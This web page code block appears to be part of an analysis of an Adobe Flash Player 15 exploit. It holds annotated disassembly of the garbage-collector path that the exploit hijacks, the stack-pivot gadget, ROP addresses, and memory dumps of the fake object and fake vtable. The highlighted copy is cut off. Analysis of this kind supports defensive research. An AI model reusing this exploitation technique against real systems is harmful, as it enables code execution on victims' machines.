			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
1.	Find vector to be collected, eax is the vector to be collected, and ebp is the fake_gc_object, here it is overwritten to 0x05113c00.
.text:10664E6D                 mov     ebp, [eax+4] ; eax = vector, 0x05111020
.text:10664E70                 mov     [esp+24h+var_8], ebp ; ebp = 0x05113c00
.text:10664E74                 mov     [esp+24h+arg_0], ebx
.text:10664E78                 cmp     ebx, esi
.text:10664E7A                 jbe     short loc_10664E82
.text:10664E7C                 mov     [esp+24h+arg_0], esi
.text:10664E80                 mov     ebx, esi
…
.text:10664FFF loc_10664FFF:
.text:10664FFF                 push    1               ; int
.text:10665001                 push    eax             ; int
.text:10665002                 mov     ecx, ebp        ; int; ecx = 0x05113c00
.text:10665004                 call    sub_105F0930

2.	The sub_105F0930 function  sends the fake_gc_object of vector [0x05113c00] to sub_105F07F0
.text:105F093E                 mov     esi, ecx
.text:105F0940                 jge     short loc_105F0949
.text:105F0942                 add     [esi+eax*4+1DCh], ebx
…
.text:105F095C                 mov     ecx, esi        ; int; ecx = 0x05113c00
.text:105F095E                 call    sub_105F07F0
...
3.	The sub_105F07F0 function does the collection work and sends fake_gc_object to sub_105F06F0
.text:105F07F0                 sub     esp, 20h
.text:105F07F3                 push    esi
.text:105F07F4                 mov     esi, ecx; esi = 0x05113c00
.text:105F07F6                 cmp     byte ptr [esi+5], 0
.text:105F07FA                 jnz     loc_105F08A2
.text:105F0800                 mov     eax, [esi+1E4h]
.text:105F0806                 push    0
.text:105F0808                 push    offset a_gc_collection ; ".gc.CollectionWork"
…
.text:105F0861 loc_105F0861:
.text:105F0861                 push    1               ; char
.text:105F0863                 push    1               ; int
.text:105F0865                 mov     ecx, esi        ; int; ecx = 0x05113c00
.text:105F0867                 call    sub_105F06F0

4.	The sub_105F06F0 function gets an unknown_object from fake_gc_object and sends it to sub_100436E0
.text:105F06F0                 sub     esp, 20h
.text:105F06F3                 push    esi
.text:105F06F4                 mov     esi, ecx ; esi = fake_gc_object = 0x05113c00
.text:105F06F6                 cmp     byte ptr [esi+5], 0
.text:105F06FA                 jnz     loc_105F0781
.text:105F0700                 cmp     dword ptr [esi+2B0h], 0
.text:105F0707                 jnz     short loc_105F0781
.text:105F0709                 cmp     byte ptr [esi+2AAh], 0
.text:105F0710                 jnz     short loc_105F0781
.text:105F0712                 cmp     byte ptr [esi+7B8h], 0
.text:105F0719                 jnz     short loc_105F0781
.text:105F071B                 mov    eax, [esi+1E4h] ; eax = 0x05113d80
.text:105F0721                 push    edi
.text:105F0722                 push    0
.text:105F0724                 push    offset a_gc_collect ; ".gc.Collect"
.text:105F0729                 push    eax ; eax = unknown_object = 0x05113d80
.text:105F072A                 lea     ecx, [esp+34h+var_20]
.text:105F072E                 call    sub_100436E0

5.	The sub_100436E0 function is a wrapper function, as it does nothing more than push the 1st argument and calls the sub_1004295C function
.text:100436E0                 push    esi
.text:100436E1                 push    [esp+4+arg_8]
.text:100436E5                 mov     esi, ecx
.text:100436E7                 push    [esp+8+arg_4]
.text:100436EB                 mov     dword ptr [esi], offset off_10B5BEEC
.text:100436F1                 push   [esp+0Ch+arg_0] ; 1st argument is unknown_object
.text:100436F5                 call    sub_1004295C

6.	The sub_1004295C function performs a vtable call of unknown_object and stack pivot exec at last.
.text:1004295C                 mov     eax, [esp+arg_4]
.text:10042960                 push    esi
.text:10042961                 mov     esi, ecx
.text:10042963                 mov     ecx, [esp+4+arg_0] ; ecx = unknown_object
.text:10042967                 mov     [esi+0Ch], eax
.text:1004296A                 mov     al, [esp+4+arg_8]
.text:1004296E                 mov     [esi+18h], ecx
.text:10042971                 mov     [esi+8], al
.text:10042974                 test    ecx, ecx
.text:10042976                 jz      short loc_1004298B
.text:10042978                 cmp     byte ptr [ecx+4], 0
.text:1004297C                 jz      short loc_1004298B
.text:1004297E                 mov     eax, [ecx] ; eax is vtable = 0x05114000
.text:10042980                 call    dword ptr [eax+4] ; jump 0x1015b6be

0:008&gt; u 1015b6be
Flash32_15_0_0_246+0x15b6be:
1015b6be 8b01            mov     eax,dword ptr [ecx]
1015b6c0 51              push    ecx
1015b6c1 ff5008          call    dword ptr [eax+8] 

This is the first ROP address
0:008&gt; u 10020740
Flash32_15_0_0_246+0x20740:
10020740 94              xchg    eax,esp
10020741 c3              ret

the vectorData buffer
05111000 00000000 00000000 05112000 03c62000
05111010 01f80008 00000000 00000000 10f69b44
05111020 40000000 05113c00 feedbabe 000014d0
05111030 babeface 00000000 00000000 00000000
05111040 00000000 00000000 00000000 0000000

The memory used in garbage collector above, 05113c00 is the fake_gc_object
0:008&gt; dc 05113c00 + 1e4
05113de4  05113d80 cccccccc cccccccc cccccccc  .=..............

Unknown_object
05113d80 05114000 00000001 cccccccc cccccccc

Fake vtable of Unknown_object, 1015b6be is the 1st executed address, 10020740 is the 2nd executed address, etc…
05114000 1000b5d2 1015b6be 10020740 1019cc26
05114010 1028297c 10064fc5 7c809ae1 05114030
05114020 05114000 00002000 00001000 00000040
05114030 002ce860 c6610000 89000447 c031fcf4</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-2">2</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-4">4</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-6">6</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-8">8</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-10">10</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-12">12</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-14">14</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-16">16</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-18">18</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-20">20</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-22">22</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-24">24</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-26">26</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-28">28</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-30">30</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-32">32</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-34">34</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-36">36</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-38">38</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-40">40</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-42">42</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-44">44</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-46">46</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-48">48</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-49">49</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-50">50</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-51">51</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-52">52</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-53">53</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-54">54</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-55">55</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-56">56</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-57">57</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-58">58</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-59">59</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-60">60</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-61">61</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-62">62</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-63">63</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-64">64</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-65">65</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-66">66</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-67">67</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-68">68</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-69">69</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-70">70</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-71">71</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-72">72</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-73">73</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-74">74</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-75">75</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-76">76</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-77">77</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-78">78</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-79">79</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-80">80</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-81">81</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-82">82</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-83">83</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-84">84</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-85">85</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-86">86</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-87">87</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-88">88</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-89">89</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-90">90</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-91">91</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-92">92</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-93">93</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-94">94</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-95">95</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-96">96</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-97">97</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-98">98</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-99">99</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-100">100</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-101">101</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-102">102</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-103">103</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-104">104</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-105">105</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-106">106</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-107">107</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-108">108</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-109">109</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-110">110</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-111">111</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-112">112</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-113">113</div><div class="crayon-num crayon-striped-num" data-line="crayon-5f69285f567a7439638303-114">114</div><div class="crayon-num" data-line="crayon-5f69285f567a7439638303-115">115</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-5f69285f567a7439638303-1"><span class="crayon-cn">1.</span><span class="crayon-h">	</span><span class="crayon-e">Find </span><span class="crayon-e">vector </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-e">be </span><span class="crayon-v">collected</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">eax </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-e">the </span><span class="crayon-e">vector </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-e">be </span><span class="crayon-v">collected</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-st">and</span><span class="crayon-h"> </span><span class="crayon-e">ebp </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-e">the </span><span class="crayon-v">fake_gc_object</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-e">here </span><span class="crayon-e">it </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-e">overwritten </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-cn">0x05113c00.</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-2"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10664E6D</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">ebp</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">eax</span><span class="crayon-o">+</span><span class="crayon-cn">4</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">eax</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">vector</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0x05111020</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-3"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10664E70</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">mov</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">[</span><span class="crayon-v">esp</span><span class="crayon-o">+</span><span class="crayon-cn">24h</span><span class="crayon-o">+</span><span class="crayon-v">var_8</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ebp</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">ebp</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x05113c00</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-4"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10664E74</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">mov</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">[</span><span class="crayon-v">esp</span><span class="crayon-o">+</span><span class="crayon-cn">24h</span><span class="crayon-o">+</span><span class="crayon-v">arg_0</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ebx</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-5"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10664E78</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">cmp&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">ebx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">esi</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-6"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10664E7A</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">jbe&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">short</span><span class="crayon-h"> </span><span class="crayon-v">loc</span><span class="crayon-sy">_</span>10664E82</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-7"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10664E7C</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">mov</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">[</span><span class="crayon-v">esp</span><span class="crayon-o">+</span><span class="crayon-cn">24h</span><span class="crayon-o">+</span><span class="crayon-v">arg_0</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">esi</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-8"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10664E80</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">ebx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">esi</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-9">…</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-10"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10664FFF</span><span class="crayon-h"> </span><span class="crayon-v">loc_10664FFF</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-11"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10664FFF</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">push</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-cn">1</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-t">int</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-12"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10665001</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">push&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">eax</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-t">int</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-13"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10665002</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">ecx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ebp</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">ecx</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x05113c00</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-14"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10665004</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">call&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">sub</span><span class="crayon-sy">_</span>105F0930</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-15">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-16"><span class="crayon-cn">2.</span><span class="crayon-h">	</span><span class="crayon-e">The </span><span class="crayon-e">sub_105F0930 </span><span class="crayon-t">function</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-e">sends </span><span class="crayon-e">the </span><span class="crayon-e">fake_gc_object </span><span class="crayon-e">of </span><span class="crayon-i">vector</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-cn">0x05113c00</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-st">to</span><span class="crayon-h"> </span><span class="crayon-v">sub</span><span class="crayon-sy">_</span>105F07F0</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-17"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F093E</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">esi</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ecx</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-18"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0940</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">jge&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">short</span><span class="crayon-h"> </span><span class="crayon-v">loc</span><span class="crayon-sy">_</span>105F0949</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-19"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F0942</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">add</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">[</span><span class="crayon-v">esi</span><span class="crayon-o">+</span><span class="crayon-e ">eax*</span><span class="crayon-cn">4</span><span class="crayon-o">+</span><span class="crayon-cn">1DCh</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ebx</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-20">…</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-21"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F095C</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">ecx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">esi</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-t">int</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">ecx</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x05113c00</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-22"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">105F095E</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">call&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">sub</span><span class="crayon-sy">_</span>105F07F0</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-23"><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line crayon-striped-line" 